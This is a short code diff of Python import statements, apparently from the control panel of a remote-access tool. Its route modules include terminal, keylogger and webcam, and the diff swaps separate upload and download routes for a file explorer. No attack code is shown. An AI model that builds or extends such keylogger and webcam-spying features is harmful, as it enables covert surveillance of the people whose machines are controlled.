@@ -24,6 +24,5 @@ from routes import dashboard
 from routes import terminal
 from routes import keylogger
 from routes import webcam
-from routes import upload
-from routes import download
+from routes import explorer
 from routes import api
